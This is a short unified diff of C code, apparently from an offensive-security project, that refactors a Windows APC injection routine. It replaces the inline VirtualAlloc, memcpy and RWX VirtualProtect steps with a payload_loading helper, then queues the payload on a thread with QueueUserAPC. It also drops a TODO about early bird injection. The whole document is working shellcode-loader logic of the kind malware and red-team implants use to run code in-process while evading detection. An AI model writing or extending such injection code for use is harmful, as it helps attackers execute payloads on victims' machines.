@@ -20,29 +20,16 @@ VOID AlertableFunction() {
 
 static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSize) {
     PVOID pAddress = NULL;
-    DWORD dwOldProtection = 0;
 
-    // Allocate memory for payload
-    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (pAddress == NULL) {
-        DebugPrint("\t[!] VirtualAlloc Failed With Error: %d \n", GetLastError());
+    if (!payload_loading(&pAddress, pPayload, sPayloadSize)) {
+        DebugPrint("[!] Payload Loading Failed...\n");
         return FALSE;
     }
 
-    // Copy payload to allocated memory
-    memcpy(pAddress, pPayload, sPayloadSize);
-
-    DebugPrint("\t[i] Payload Written To: 0x%p \n", pAddress);
-
-    // Change memory protection to executable
-    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
-        DebugPrint("\t[!] VirtualProtect Failed With Error: %d \n", GetLastError());
-        VirtualFree(pAddress, 0, MEM_RELEASE);
-        return FALSE;
-    }
+    DebugPrint("[i] QueueUserAPC with payload located at: 0x%llx\n", (ULONG_PTR)pAddress);
 
     // Queue the APC payload
-    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
+    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)pAddress, hThread, NULL)) {
         DebugPrint("\t[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
         VirtualFree(pAddress, 0, MEM_RELEASE);
         return FALSE;
@@ -76,5 +63,3 @@ BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPaylo
 
     return TRUE;
 }
-
-//TODO: early bird injection
